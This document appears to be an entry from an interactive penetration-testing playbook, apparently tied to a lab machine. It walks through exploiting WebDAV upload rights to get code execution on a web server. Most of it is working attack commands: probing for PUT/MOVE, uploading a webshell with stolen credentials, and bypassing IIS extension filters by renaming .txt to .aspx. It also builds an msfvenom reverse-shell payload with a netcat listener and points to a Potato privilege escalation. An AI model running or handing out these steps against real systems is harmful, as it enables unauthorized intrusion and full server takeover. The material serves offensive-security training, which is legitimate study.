title: WebDAV → Webshell → RCE (server-side upload)
body: OPTIONS showed PUT/MOVE in the Allow header. Drop a webshell into a directory the web server executes, then browse to it. The shell is a file YOU create on Kali first, then upload. Match the extension to the stack: IIS runs .aspx, Apache/PHP runs .php.
cmd:
# ════════════════════════════════════════════════════════
# WEBDAV → WEBSHELL → RCE  (you upload, the server runs it)
# ════════════════════════════════════════════════════════

# -- STEP 1: Confirm WebDAV and find WHERE it lives ----------
# Test the ROOT first - WebDAV is often at /  NOT /webdav/ :
curl -s -i -X OPTIONS http://$ip/ | grep -i -E 'allow|dav'
# Probe common dirs too if root is read-only:
for dir in / /webdav/ /dav/ /uploads/ /files/ ; do echo "== $dir =="; curl -s -i -X OPTIONS http://$ip$dir | grep -i allow; done
# PUT in the Allow line = you can upload there.

# -- STEP 2: Handle auth (401 = creds required) --------------
# Saw 'Unauthorized. Basic realm=...'? WebDAV needs creds. Use the domain
# cred you already found in enum. davtest reveals what PUTs AND what EXECUTES:
davtest -url http://$ip -auth 'USER:PASS'
# Still 401 on a domain? try the prefixed form:
davtest -url http://$ip -auth 'DOMAIN\USER:PASS'

# -- STEP 3: Make the right shell for the stack --------------
# 'shell.aspx' is a FILE YOU CREATE on Kali first - not magic. Grab a ready one:
cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx        # IIS / ASP.NET
cp /usr/share/webshells/php/php-reverse-shell.php shell.php # Apache / PHP
cat shell.aspx     # it's just a web form that runs cmd.exe server-side
# IIS (like Hutch) → use .aspx. A .php shell on IIS just downloads as text.

# -- STEP 4: Upload (extension bypass for IIS) ---------------
# IIS blocks PUT of .aspx directly but allows .txt - so PUT as .txt then
# MOVE to .aspx (WebDAV MOVE renames on the server):
curl -s -u 'USER:PASS' -X PUT http://$ip/shell.txt --data-binary @shell.aspx
curl -s -u 'USER:PASS' -X MOVE http://$ip/shell.txt -H "Destination: http://$ip/shell.aspx"
# Direct PUT (PHP stack, or when the exec ext isn't filtered):
curl -s -u 'USER:PASS' -X PUT http://$ip/shell.php --data-binary @shell.php
# IIS negotiating NTLM not Basic? swap -u for:  --ntlm -u 'DOMAIN\USER:PASS'

# -- STEP 5: VERIFY execution -------------------------------
curl -s -u 'USER:PASS' "http://$ip/shell.aspx" | head
# SUCCESS = the webshell page / command output comes back.
# 404 = it uploaded somewhere NOT under webroot (see GOTCHAS).
# 403 = that extension is filtered - try another exec extension.

# -- STEP 6: Upgrade to a real reverse shell ----------------
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f aspx -o rev.aspx
# upload rev.aspx the same way (PUT .txt -> MOVE .aspx), start a listener:
nc -lvnp 443
# then browse http://$ip/rev.aspx to fire it.

# -- STEP 7: You're the IIS account → PRIVESC ------------
whoami
whoami /priv
# IIS app pool (iis apppool\... / a web_svc) almost always has
# SeImpersonatePrivilege → Potato attack → SYSTEM. That's the next move.
warn: WebDAV is often at the web ROOT (/), not /webdav/ - test / first or you'll chase 404s. Match the shell to the stack: IIS runs .aspx, NOT .php (a php shell on IIS downloads as text). A 401 means creds required: re-run with -auth (Basic) or --ntlm (DOMAIN\user). If upload succeeds but browsing 404s, the WebDAV dir isn't under webroot - you can write but not execute; find a path that's both writable and served. Once you land, the IIS account usually has SeImpersonate → token_privs.

choices.label: Got a webshell → upgrade to reverse shell
Shell as IIS account → check token privs (SeImpersonate)
Upload works but 404 on browse → wrong dir
